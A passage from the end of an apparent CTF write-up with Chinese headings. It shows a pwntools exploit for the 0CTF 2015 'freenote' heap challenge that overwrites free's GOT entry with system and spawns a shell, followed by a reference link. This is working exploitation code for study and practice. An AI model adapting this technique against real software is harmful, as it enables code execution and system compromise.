    editnote(0, p64(2) + p64(1)+p64(8)+p64(elf.got['free']))    # Note.content = free_got
    editnote(0, p64(system_addr))   # free => system

def pwn():
    delnote(1)  # system('/bin/sh')
    io.interactive()

if __name__ == "__main__":
    leak_base()
    unlink()
    overwrite_note()
    pwn()
```


## 参考资料
[0CTF 2015 Quals CTF: freenote](https://github.com/ctfs/write-ups-2015/tree/master/0ctf-2015/exploit/freenote)
